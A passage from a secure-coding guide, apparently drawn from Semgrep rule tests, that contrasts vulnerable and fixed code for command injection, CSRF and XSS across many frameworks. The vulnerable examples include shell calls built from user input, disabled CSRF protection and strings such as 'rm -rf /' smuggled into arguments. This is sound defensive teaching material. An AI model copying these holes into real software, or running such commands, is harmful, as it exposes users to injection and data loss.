            var process = Process.Start("constant", "constant");
        }

        public void RunOsCommandWithStartInfo(string command)
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo()
            {
                FileName = "constant"
            };
            // ok: os-command-injection
            var process = Process.Start(processStartInfo);
        }
    }
}
```

---

**Incorrect: dangerous process run with user input**

```scala
class TestOsCommand {

  def executeCommand(value: String) = Action {
    import sys.process._

    // ruleid: scala-dangerous-process-run
    val result = value.!!
    Ok("Result:\n"+result)
  }

  def executeCommand2(value: String) = Action {
    import sys.process._

    // ruleid: scala-dangerous-process-run
    val result = value !
    Ok("Result:\n"+result)
  }
}
```

**Correct: safe process usage**

```scala
class TestOsCommand {

  def executeCommand4(value: String) = Action {
    import sys.process._

    // ok: scala-dangerous-process-run
    val cmd = "ls -lah"
    val result = cmd.!
    Ok("Result:\n"+result)
  }

  def executeCommand6() = Action {
    import sys.process._

    // ok: scala-dangerous-process-run
    val result = Seq("ls", "-lah").!!
    Ok("Result:\n"+result)
  }
}
```

**Incorrect: dangerous shell run with user input**

```scala
class Foo {
  def run1(message: String) = {
    import sys.process._
    // ruleid: dangerous-shell-run
    Seq("sh", "-c", message).!
  }

  def run2(message: String) = {
    import sys.process._
    // ruleid: dangerous-shell-run
    val result = Seq("bash", "-c", message).!!
    return result
  }
}
```

**Correct: safe shell usage**

```scala
class Foo {
  def run3(message: String) = {
    import sys.process._
    // ok: dangerous-shell-run
    Seq("ls", "-la").!!
  }

  def run4(message: String) = {
    import sys.process._
    // ok: dangerous-shell-run
    Seq("sh", "-c", "ls").!!
  }
}
```

**Incorrect: dangerous Seq run**

```scala
class Foo {
  def run1(command: String, arg1: String) = {
    import sys.process._
    // ruleid: dangerous-seq-run
    Seq(command, arg1).!
  }

  def run2(command: String) = {
    import sys.process._
    // ruleid: dangerous-seq-run
    val result = Seq(command, "--some-arg").!!
    return result
  }
}
```

**Correct: safe Seq usage**

```scala
class Foo {
  def run3(message: String) = {
    import sys.process._
    // ok: dangerous-seq-run
    Seq("ls", "-la").!!
  }
}
```

---

**Incorrect: Runtime.exec with formatted string**

```kotlin
class Cls {
    fun Cls(input: String) {
        val r: Runtime = Runtime.getRuntime()
        // ruleid: command-injection-formatted-runtime-call
        r.exec("/bin/sh -c some_tool" + input)
    }

    fun test1(input: String) {
        val r: Runtime = Runtime.getRuntime()
        // ruleid: command-injection-formatted-runtime-call
        r.loadLibrary(String.format("%s.dll", input))
    }
}
```

**Correct: safe Runtime usage**

```kotlin
class Cls {
    fun test2(input: String) {
        val r: Runtime = Runtime.getRuntime()
        // ok: command-injection-formatted-runtime-call
        r.exec("echo 'blah'")
    }
}
```

---

**Incorrect: Shell methods with tainted input**

```ruby
def foo
  # ruleid: avoid-tainted-shell-call
  Shell.cat(params[:filename])

  sh = Shell.cd("/tmp")
  # ruleid: avoid-tainted-shell-call
  sh.open(params[:filename])

  sh = Shell.new
  fn = params[:filename]
  # ruleid: avoid-tainted-shell-call
  sh.open(fn)
end
```

**Correct: safe Shell usage**

```ruby
def foo
  # ok: avoid-tainted-shell-call
  Shell.cat("/var/log/www/access.log")
end
```

---

**Incorrect: command execution with user input**

```php
<?php
// ruleid: wp-command-execution-audit
exec('rm -rf ' . $dir, $o, $r);

// ruleid: wp-command-execution-audit
$stderr = shell_exec($command);

// ruleid: eval-use
eval($user_input);
?>
```

**Correct: safe command usage**

```php
<?php
// ok: wp-command-execution-audit
some_other_safe_function($args);

// ok: eval-use
eval('echo "OK"');
?>
```

---

**Incorrect: dangerous command write**

```go
import (
  "fmt"
  "os/exec"
)

func test1(password string) {
  cmd := exec.Command("bash")
  cmdWriter, _ := cmd.StdinPipe()
  cmd.Start()

  cmdString := fmt.Sprintf("sshpass -p %s", password)

  // ruleid: dangerous-command-write
  cmdWriter.Write([]byte(cmdString + "\n"))

  cmd.Wait()
}
```

**Correct: safe command usage**

```go
import (
  "os/exec"
)

func okTest1() {
  cmd := exec.Command("bash")
  cmdWriter, _ := cmd.StdinPipe()
  cmd.Start()

  // ok: dangerous-command-write
  cmdWriter.Write([]byte("sshpass -p 123\n"))
  cmdWriter.Write([]byte("exit" + "\n"))

  cmd.Wait()
}
```

---

**Incorrect: executing external programs**

```ocaml
#load "unix.cma";;
let p = String.concat "ls " [" "; Sys.argv.(1)]
(* ruleid: ocamllint-exec *)
let a = Unix.execve p
(* ruleid: ocamllint-exec *)
let b = Unix.execvp p
(* ruleid: ocamllint-exec *)
let d = Unix.system p
(* ruleid: ocamllint-exec *)
let e = Sys.command p
```

---

**Incorrect: dangerous subprocess in Lambda**

```python
import subprocess

def handler(event, context):
  # ruleid: dangerous-subprocess-use
  subprocess.call("grep -R {} .".format(event['id']), shell=True)

  cmd = event['id'].split()
  # ruleid: dangerous-subprocess-use
  subprocess.call([cmd[0], cmd[1], "some", "args"], shell=True)
```

**Correct: safe subprocess in Lambda**

```python
import subprocess

def handler(event, context):
  # ok: dangerous-subprocess-use
  subprocess.call("echo 'hello'")

  # ok: dangerous-subprocess-use
  subprocess.call(["echo", "a", ";", "rm", "-rf", "/"])
```

**Incorrect: dangerous system call in Lambda**

```python
import os

def handler(event, context):
    # ruleid: dangerous-system-call
    os.system(f"ls -la {event['dir']}")
```

**Correct: safe system call in Lambda**

```python
import os

def handler(event, context):
    # ok: dangerous-system-call
    os.system("ls -al")

    # ok: dangerous-system-call
    os.popen("cat contents.txt")
```

---

**Incorrect: child_process in Lambda**

```javascript
const cp = require('child_process');

exports.handler = async (event) => {
    // ruleid: detect-child-process
    cp.exec(`cat *.js ${event['file']}| wc -l`, (error, stdout, stderr) => {
        console.log(stdout)
    });

    // ruleid: detect-child-process
    cp.spawnSync(event['cmd']);
};
```

**Correct: safe child_process in Lambda**

```javascript
const cp = require('child_process');

exports.handler = async (event) => {
    // ok: detect-child-process
    cp.exec('ls')
};
```

---

**Incorrect: formatted string in BashOperator**

```python
from airflow.operators.bash_operator import BashOperator
import requests

message = requests.get("https://fakeurl.asdf/message").text
# ruleid: formatted-string-bashoperator
t1 = BashOperator(
    task_id="print_date",
    bash_command="echo " + message,
    dag=dag
)

howlong = requests.get("https://fakeurl.asdf/howlong").text
# ruleid: formatted-string-bashoperator
command = "sleep {}".format(howlong)
t2 = BashOperator(
    task_id="sleep",
    bash_command=command,
    dag=dag
)
```

**Correct: safe BashOperator usage**

```python
from airflow.operators.bash_operator import BashOperator

# ok: formatted-string-bashoperator
t5 = BashOperator(
    task_id="safe",
    bash_command="echo hello world!",
    dag=dag
)

# ok: formatted-string-bashoperator
templated_command = """
{% for i in range(5) %}
    echo "{{ ds }}"
    echo "{{ params.my_param }}"
{% endfor %}
"""

t4 = BashOperator(
    task_id="safe_templated",
    bash_command=templated_command,
    params={"my_param": "Parameter I passed in"},
    dag=dag
)
```

---

**References:**

- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

- CWE-94: Improper Control of Generation of Code ('Code Injection')

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

- [OWASP Top 10 A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection)

- [Semgrep Python Command Injection Cheat Sheet](https://semgrep.dev/docs/cheat-sheets/python-command-injection/)

- [Node.js Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#do-not-use-dangerous-functions)

- [OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

### 0.11 Prevent Cross-Site Request Forgery

**Impact: HIGH (Attackers can force authenticated users to perform unwanted actions, potentially modifying data, transferring funds, or changing account settings)**

Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to execute unwanted actions on a web application. When a user is authenticated, their browser automatically includes session cookies with requests. Attackers can craft malicious pages that trigger requests to vulnerable applications, causing actions to be performed without the user's consent. CSRF attacks can result in unauthorized fund transfers, email address changes, password changes, or any other state-changing operation.

---

**Incorrect: disables CSRF protection entirely**

```ruby
class CustomStrategy
    def initialize(controller)
      @controller = controller
    end

    def handle_unverified_request
      # Custom behaviour for unverfied request
    end
  end

  class ApplicationController < ActionController::Base
    # ruleid: rails-skip-forgery-protection
    skip_forgery_protection
  end
```

**Correct: CSRF protection enabled by default**

```ruby
class ApplicationController2 < ActionController::Base
    # ok: rails-skip-forgery-protection
  end
```

**References:**

- [Rails ActionController RequestForgeryProtection](https://api.rubyonrails.org/classes/ActionController/RequestForgeryProtection/ClassMethods.html#method-i-skip_forgery_protection)

---

**Incorrect: controller without protect_from_forgery**

```ruby
# ruleid:missing-csrf-protection
class DangerousController < ActionController::Base

  puts "do more stuff"

end
```

**Correct: controller with protect_from_forgery**

```ruby
# ok:missing-csrf-protection
class OkController < ActionController::Base

  protect_from_forgery :with => :exception

  puts "do more stuff"

end

# ok:missing-csrf-protection
class OkController < ActionController::Base

  protect_from_forgery prepend: true, with: :exception

  puts "do more stuff"

end
```

**References:**

- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect (csrf() before methodOverride() allows bypass):**

```javascript
function bad() {
    // ruleid:detect-no-csrf-before-method-override
    express.csrf()
    express.methodOverride()
}
```

**Correct (methodOverride() before csrf()):**

```javascript
function ok() {
    // ok:detect-no-csrf-before-method-override
    express.methodOverride()
    express.csrf()
}
```

**References:**

- [Bypass Connect CSRF Protection by Abusing Method Override](https://github.com/nodesecurity/eslint-plugin-security/blob/master/docs/bypass-connect-csrf-protection-by-abusing.md)

---

**Incorrect: Express app without csurf middleware**

```javascript
var cookieParser = require('cookie-parser') //for cookie parsing
// var csrf = require('csurf') //csrf module
var bodyParser = require('body-parser') //for body parsing

var express = require('express')

// setup route middlewares
var csrfProtection = csrf({
    cookie: true
})
var parseForm = bodyParser.urlencoded({
    extended: false
})

// ruleid: express-check-csurf-middleware-usage
var app = express()

// parse cookies
app.use(cookieParser())

app.get('/form', csrfProtection, function(req, res) {
    // generate and pass the csrfToken to the view
    res.render('send', {
        csrfToken: req.csrfToken()
    })
})

app.post('/process', parseForm, csrfProtection, function(req, res) {
    res.send('data is being processed')
})

app.post('/bad', parseForm, function(req, res) {
    res.send('data is being processed')
})
```

**Correct: include csurf or csrf middleware**

```javascript
var csrf = require('csurf')
var express = require('express')

// ok: express-check-csurf-middleware-usage
var app = express()
app.use(csrf({ cookie: true }))
```

**References:**

- [csurf npm package](https://www.npmjs.com/package/csurf)

- [csrf npm package](https://www.npmjs.com/package/csrf)

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

**Incorrect: state-changing methods without ValidateAntiForgeryToken**

```csharp
using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using MvcMovie.Models;

public class HomeController : Controller
{
    private readonly ILogger<HomeController> _logger;

    public HomeController(ILogger<HomeController> logger)
    {
        _logger = logger;
    }

    public IActionResult Index()
    {
        return View();
    }

    //ruleid: mvc-missing-antiforgery
    [HttpPost]
    public IActionResult CreateBad(User user){
      CreateUser(user);
    }

    //ruleid: mvc-missing-antiforgery
    [HttpDelete]
    public IActionResult DeleteBad(User user){
      DeleteUser(user);
    }
}
```

**Correct: add ValidateAntiForgeryToken or strict Content-Type checking**

```csharp
using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using MvcMovie.Models;

public class HomeController : Controller
{
    //ok: mvc-missing-antiforgery
    [HttpPost]
    [ValidateAntiForgeryToken]
    public IActionResult CreateGood(User user){
      CreateUser(user);
    }

    //ok: mvc-missing-antiforgery
    [HttpPost]
    //strict type checking enforces CORS preflight for non-simple HTTP requests
    [Consumes("application/json")]
    public IActionResult CreateGood(User user){
      CreateUser(user);
    }

    //ok: mvc-missing-antiforgery
    [ValidateAntiForgeryToken]
    [HttpDelete]
    public IActionResult DeleteGood(User user){
      CreateUser(user);
    }
}
```

**References:**

- [.NET Security Cheat Sheet - CSRF](https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html#cross-site-request-forgery)

- [MDN CORS Simple Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)

---

**Incorrect: RequestMapping without specifying HTTP method**

```java
// cf. https://find-sec-bugs.github.io/bugs.htm#SPRING_CSRF_UNRESTRICTED_REQUEST_MAPPING

@Controller
public class Controller {

    // ruleid: unrestricted-request-mapping
    @RequestMapping("/path")
    public void writeData() {
        // State-changing operations performed within this method.
    }

    // ruleid: unrestricted-request-mapping
    @RequestMapping(value = "/path")
    public void writeData2() {
        // State-changing operations performed within this method.
    }
}
```

**Correct: specify HTTP method in RequestMapping**

```java
@Controller
public class Controller {

    /**
     * For methods without side-effects use either
     * RequestMethod.GET, RequestMethod.HEAD, RequestMethod.TRACE, or RequestMethod.OPTIONS.
     */
    // ok: unrestricted-request-mapping
    @RequestMapping(value = "/path", method = RequestMethod.GET)
    public String readData() {
        // No state-changing operations performed within this method.
        return "";
    }

    /**
     * For state-changing methods use either
     * RequestMethod.POST, RequestMethod.PUT, RequestMethod.DELETE, or RequestMethod.PATCH.
     */
    // ok: unrestricted-request-mapping
    @RequestMapping(value = "/path", method = RequestMethod.POST)
    public void writeData3() {
        // State-changing operations performed within this method.
    }
}
```

**References:**

- [Find Security Bugs - Spring CSRF Unrestricted Request Mapping](https://find-sec-bugs.github.io/bugs.htm#SPRING_CSRF_UNRESTRICTED_REQUEST_MAPPING)

---

**Incorrect: explicitly disabling CSRF protection**

```java
package com.example.securingweb;   // cf. https://spring.io/guides/gs/securing-web/

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.provisioning.InMemoryUserDetailsManager;

@Configuration
@EnableWebSecurity
public class WebSecurityConfigCsrfDisable extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        // ruleid: spring-csrf-disabled
        http
            .csrf().disable()
            .authorizeRequests()
                .antMatchers("/", "/home").permitAll()
                .anyRequest().authenticated()
                .and()
            .formLogin()
                .loginPage("/login")
                .permitAll()
                .and()
            .logout()
                .permitAll();
    }
}
```

**Correct: CSRF protection enabled by default**

```java
public class WebSecurityConfigOK extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        // ok: spring-csrf-disabled
        http
            .authorizeRequests()
                .antMatchers("/", "/home").permitAll()
                .anyRequest().authenticated()
                .and()
            .formLogin()
                .loginPage("/login")
                .permitAll()
                .and()
            .logout()
                .permitAll();
    }
}
```

**References:**

- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect: using @csrf_exempt decorator**

```python
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

# ruleid: no-csrf-exempt
@csrf_exempt
def my_view(request):
    return HttpResponse('Hello world')

import django

# ruleid: no-csrf-exempt
@django.views.decorators.csrf.csrf_exempt
def my_view2(request):
    return HttpResponse('Hello world')
```

**Correct: remove csrf_exempt decorator**

```python
from django.http import HttpResponse

# ok: no-csrf-exempt
def my_view(request):
    return HttpResponse('Hello world')
```

**References:**

- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect: disabling CSRF checks globally**

```python
from pyramid.csrf import CookieCSRFStoragePolicy


def includeme_bad(config):
    config.set_csrf_storage_policy(CookieCSRFStoragePolicy())
    # ruleid: pyramid-csrf-check-disabled-globally
    config.set_default_csrf_options(require_csrf=False)
```

**Correct: enable CSRF checks**

```python
from pyramid.csrf import CookieCSRFStoragePolicy


def includeme_good(config):
    config.set_csrf_storage_policy(CookieCSRFStoragePolicy())
    # ok: pyramid-csrf-check-disabled-globally
    config.set_default_csrf_options(require_csrf=True)
```

**References:**

- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect: disabling CSRF for specific view**

```python
from pyramid.view import view_config


@view_config(
    route_name='home_bad1',
    # ruleid: pyramid-csrf-check-disabled
    require_csrf=False,
    renderer='my_app:templates/mytemplate.jinja2'
)
def my_bad_home1(request):
    try:
        query = request.dbsession.query(models.MyModel)
        one = query.filter(models.MyModel.name == 'one').one()
    except SQLAlchemyError:
        return Response("Database error", content_type='text/plain', status=500)
    return {'one': one, 'project': 'my_proj'}
```

**Correct: enable CSRF for view**

```python
from pyramid.view import view_config


@view_config(
    route_name='home_bad1',
    # ok: pyramid-csrf-check-disabled
    require_csrf=True,
    renderer='my_app:templates/mytemplate.jinja2'
)
def my_good_home1(request):
    try:
        query = request.dbsession.query(models.MyModel)
        one = query.filter(models.MyModel.name == 'one').one()
    except SQLAlchemyError:
        return Response("Database error", content_type='text/plain', status=500)
    return {'one': one, 'project': 'my_proj'}
```

**References:**

- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect: disabling origin check for CSRF token**

```python
from pyramid.view import view_config


@view_config(
    route_name='home_bad1',
    # ruleid: pyramid-csrf-origin-check-disabled
    check_origin=False,
    renderer='my_app:templates/mytemplate.jinja2'
)
def my_bad_home1(request):
    try:
        query = request.dbsession.query(models.MyModel)
        one = query.filter(models.MyModel.name == 'one').one()
    except SQLAlchemyError:
        return Response("Database error", content_type='text/plain', status=500)
    return {'one': one, 'project': 'my_proj'}
```

**Correct: enable origin check**

```python
from pyramid.view import view_config


@view_config(
    route_name='home_bad1',
    # ok: pyramid-csrf-origin-check-disabled
    check_origin=True,
    renderer='my_app:templates/mytemplate.jinja2'
)
def my_good_home1(request):
    try:
        query = request.dbsession.query(models.MyModel)
        one = query.filter(models.MyModel.name == 'one').one()
    except SQLAlchemyError:
        return Response("Database error", content_type='text/plain', status=500)
    return {'one': one, 'project': 'my_proj'}
```

**References:**

- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect: disabling origin check globally**

```python
from pyramid.csrf import CookieCSRFStoragePolicy


def includeme_bad(config):
    config.set_csrf_storage_policy(CookieCSRFStoragePolicy())
    # ruleid: pyramid-csrf-origin-check-disabled-globally
    config.set_default_csrf_options(check_origin=False)
```

**Correct: enable origin check globally**

```python
from pyramid.csrf import CookieCSRFStoragePolicy


def includeme_good(config):
    config.set_csrf_storage_policy(CookieCSRFStoragePolicy())
    # ok: pyramid-csrf-origin-check-disabled-globally
    config.set_default_csrf_options(check_origin=True)
```

**References:**

- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

---

**Incorrect: disabling WTF_CSRF_ENABLED**

```python
import flask
from flask import response as r

app = flask.Flask(__name__)
# ruleid:flask-wtf-csrf-disabled
app.config['WTF_CSRF_ENABLED'] = False

# ruleid:flask-wtf-csrf-disabled
app.config["WTF_CSRF_ENABLED"] = False

# ruleid: flask-wtf-csrf-disabled
app.config.WTF_CSRF_ENABLED = False

# DICT UPDATE
################

app.config.update(
    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',
    # ruleid: flask-wtf-csrf-disabled
    WTF_CSRF_ENABLED = False,
    TESTING=False
)

# FROM OBJECT
################

# custom class
appconfig = MyAppConfig()
# ruleid: flask-wtf-csrf-disabled
appconfig.WTF_CSRF_ENABLED = False

app.config.from_object(appconfig)

# this file itself
SECRET_KEY = 'development key'
# ruleid: flask-wtf-csrf-disabled
WTF_CSRF_ENABLED = False

app.config.from_object(__name__)

# FROM MAPPING
################

app.config.from_mapping(
    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',
    # ruleid: flask-wtf-csrf-disabled
    WTF_CSRF_ENABLED = False,
)
```

**Correct: enable CSRF or only disable for testing**

```python
import flask

app = flask.Flask(__name__)

# ok: flask-wtf-csrf-disabled
app.config["WTF_CSRF_ENABLED"] = True

# ok: flask-wtf-csrf-disabled
app.config["SESSION_COOKIE_SECURE"] = False

# ok: flask-wtf-csrf-disabled
app.config.WTF_CSRF_ENABLED = True

# It's okay to do this during testing
app.config.update(
    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',
    # ok: flask-wtf-csrf-disabled
    WTF_CSRF_ENABLED = False,
    TESTING=True
)

# It's okay to do this during testing
app.config.from_mapping(
    SECRET_KEY='192b9bdd22ab9ed4d12e236c78afcb9a393ec15f71bbf5dc987d54727823bcbf',
    # ok: flask-wtf-csrf-disabled
    WTF_CSRF_ENABLED = False,
    TESTING=True
)
```

**References:**

- [Flask-WTF CSRF Protection](https://flask-wtf.readthedocs.io/en/1.2.x/csrf/)

---

**Incorrect: disabling csrf_protection in forms or configuration**

```php
<?php

use Symfony\Component\Form\AbstractType;
use Symfony\Component\OptionsResolver\OptionsResolver;
use Symfony\Component\HttpKernel\DependencyInjection\Extension;
use Symfony\Component\DependencyInjection\ContainerBuilder;
use Symfony\Component\DependencyInjection\Extension\PrependExtensionInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;


class Type extends AbstractType
{
  public function configureOptions(OptionsResolver $resolver)
  {
      // ruleid: symfony-csrf-protection-disabled
    $resolver->setDefaults([
      'data_class'      => Type::class,
      'csrf_protection' => false
    ]);

    // ruleid: symfony-csrf-protection-disabled
    $resolver->setDefaults(array(
      'csrf_protection' => false
    ));


    $csrf = false;
    // ruleid: symfony-csrf-protection-disabled
    $resolver->setDefaults([
      'csrf_protection' => $csrf
    ]);
  }
}

class TestExtension extends Extension implements PrependExtensionInterface
{
  public function prepend(ContainerBuilder $container)
  {

    // ruleid: symfony-csrf-protection-disabled
    $container->prependExtensionConfig('framework', ['csrf_protection' => false,]);

    // ruleid: symfony-csrf-protection-disabled
    $container->prependExtensionConfig('framework', ['something_else' => true, 'csrf_protection' => false,]);

    $csrfOption = false;
    // ruleid: symfony-csrf-protection-disabled
    $container->prependExtensionConfig('framework', ['csrf_protection' => $csrfOption,]);

    // ruleid: symfony-csrf-protection-disabled
    $container->loadFromExtension('framework', ['csrf_protection' => false,]);
  }
}

class MyController1 extends AbstractController
{
  public function action()
  {
    // ruleid: symfony-csrf-protection-disabled
    $this->createForm(TaskType::class, $task, [
      'other_option' => false,
      'csrf_protection' => false,
    ]);

    // ruleid: symfony-csrf-protection-disabled
    $this->createForm(TaskType::class, $task, array(
      'csrf_protection' => false,
    ));

    $csrf = false;
    // ruleid: symfony-csrf-protection-disabled
    $this->createForm(TaskType::class, $task, array(
      'csrf_protection' => $csrf,
    ));
  }
}
```

**Correct: enable CSRF protection**

```php
<?php

use Symfony\Component\Form\AbstractType;
use Symfony\Component\OptionsResolver\OptionsResolver;

class Type extends AbstractType
{
  public function configureOptions(OptionsResolver $resolver)
  {
    // ok: symfony-csrf-protection-disabled
    $resolver->setDefaults([
      'csrf_protection' => true
    ]);

    // ok: symfony-csrf-protection-disabled
    $resolver->setDefaults([
      'data_class' => Type::class,
    ]);

    // ok: symfony-csrf-protection-disabled
    $resolver->setDefaults($options);
  }
}

class TestExtension extends Extension implements PrependExtensionInterface
{
  public function prepend(ContainerBuilder $container)
  {
    // ok: symfony-csrf-protection-disabled
    $container->loadFromExtension('framework', ['csrf_protection' => null,]);

    // ok: symfony-csrf-protection-disabled
    $container->prependExtensionConfig('framework', ['csrf_protection' => true,]);

    // ok: symfony-csrf-protection-disabled
    $container->prependExtensionConfig('framework', ['csrf_protection' => null,]);

    // ok: symfony-csrf-protection-disabled
    $container->prependExtensionConfig('something_else', ['csrf_protection' => false,]);
  }
}

class MyController1 extends AbstractController
{
  public function action()
  {
    // ok: symfony-csrf-protection-disabled
    $this->createForm(TaskType::class, $task, ['csrf_protection' => true]);

    // ok: symfony-csrf-protection-disabled
    $this->createForm(TaskType::class, $task, ['other_option' => false]);
  }
}
```

**References:**

- [Symfony CSRF Protection](https://symfony.com/doc/current/security/csrf.html)

---

**Incorrect: check_ajax_referer with false third argument**

```php
<?php

// ruleid: wp-csrf-audit
check_ajax_referer( 'wpforms-admin', 'nonce', false );
```

**Correct: check_ajax_referer with die enabled**

```php
<?php

// ok: wp-csrf-audit
check_ajax_referer( 'wpforms-admin', 'nonce', true );


// ok: wp-csrf-audit
check_ajax_referer( 'wpforms-admin', 'nonce' );

?>
```

**References:**

- [WordPress CSRF Security Testing Cheat Sheet](https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#cross-site-request-forgery-csrf)

- [WordPress check_ajax_referer Reference](https://developer.wordpress.org/reference/functions/check_ajax_referer/)

---

**Incorrect: WebSocket upgrade without CheckOrigin**

```go
package main

import (
	"log"
	"net/http"

	"github.com/gorilla/websocket"
)

var upgrader2 = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

func handler_doesnt_check_origin(w http.ResponseWriter, r *http.Request) {
	// ruleid: websocket-missing-origin-check
	conn, err := upgrader2.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
		return
	}
}
```

**Correct: WebSocket upgrade with CheckOrigin**

```go
package main

import (
	"log"
	"net/http"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

var upgrader2 = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

func handler_check_origin(w http.ResponseWriter, r *http.Request) {
	// ok: websocket-missing-origin-check
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
		return
	}
}

func handler_check_origin2(w http.ResponseWriter, r *http.Request) {
	upgrader2.CheckOrigin = func(r *http.Request) bool { return true }
	// ok: websocket-missing-origin-check
	conn, err := upgrader2.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
		return
	}
}
```

**References:**

- [Gorilla WebSocket Upgrader Documentation](https://pkg.go.dev/github.com/gorilla/websocket#Upgrader)

---

**General References:**

- CWE-352: Cross-Site Request Forgery (CSRF)

- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

- [OWASP CSRF Attack Description](https://owasp.org/www-community/attacks/csrf)

### 0.12 Prevent Cross-Site Scripting (XSS)

**Impact: CRITICAL (Client-side code execution, session hijacking, credential theft)**

XSS occurs when untrusted data is included in web pages without proper validation or escaping. Attackers can execute scripts in victim's browser to steal cookies, session tokens, or other sensitive data.

---

**Incorrect: vulnerable to XSS**

```javascript
function bad1(userInput) {
  // ruleid: insecure-innerhtml
  el.innerHTML = '<div>' + userInput + '</div>';
}

function bad2(userInput) {
  // ruleid: insecure-innerhtml
  document.body.innerHTML = userInput;
}

function bad3(userInput) {
  const name = '<div>' + userInput + '</div>';
  // ruleid: insecure-innerhtml
  document.body.innerHTML = name;
}
```

**Correct: properly escaped**

```javascript
function ok1() {
  const name = "<div>it's ok</div>";
  // ok: insecure-innerhtml
  el.innerHTML = name;
}

function ok2() {
  // ok: insecure-innerhtml
  document.body.innerHTML = "<div>it's ok</div>";
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [OWASP Injection Guide](https://owasp.org/Top10/A03_2021-Injection)

---

**Incorrect: vulnerable to DOM-based XSS**

```javascript
// ruleid:dom-based-xss
document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");
```

**Correct: safe static content**

```javascript
// ok:dom-based-xss
document.write("<OPTION value=2>English</OPTION>");
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [OWASP DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)

---

**Incorrect: user-controlled data in document methods**

```javascript
function bad1(userInput) {
// ruleid: insecure-document-method
  el.innerHTML = '<div>' + userInput + '</div>';
}

function bad2(userInput) {
// ruleid: insecure-document-method
  document.body.outerHTML = userInput;
}

function bad3(userInput) {
  const name = '<div>' + userInput + '</div>';
// ruleid: insecure-document-method
  document.write(name);
}
```

**Correct: static content only**

```javascript
function ok1() {
  const name = "<div>it's ok</div>";
// ok: insecure-document-method
  el.innerHTML = name;
}

function ok2() {
// ok: insecure-document-method
  document.write("<div>it's ok</div>");
}
```

**References:**

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

- [OWASP Injection Guide](https://owasp.org/Top10/A03_2021-Injection)

---

**Incorrect: user input in jQuery methods**

```javascript
(function ($) {

  function bad1() {
    var content = '<div>' + window.location.hash + '</div>';
    // ruleid: jquery-insecure-method
    $( "div" ).html( content );
  }

  function bad2() {
    // ruleid: jquery-insecure-method
    $( userInput ).appendTo( "#foo" );
  }

  function bad4() {
    // ruleid: jquery-insecure-method
    $('<div>' + window.location.hash + '</div>').insertBefore( ".inner" );
    // ruleid: jquery-insecure-method
    $('.inner').prepend(window.location.hash);
  }

  function bad5(userInput) {
    // ruleid: jquery-insecure-method
    $( ".inner" ).wrap( "<div class='new'>" + userInput + "</div>" );
    // ruleid: jquery-insecure-method
    $( "p" ).wrapAll(userInput);
  }

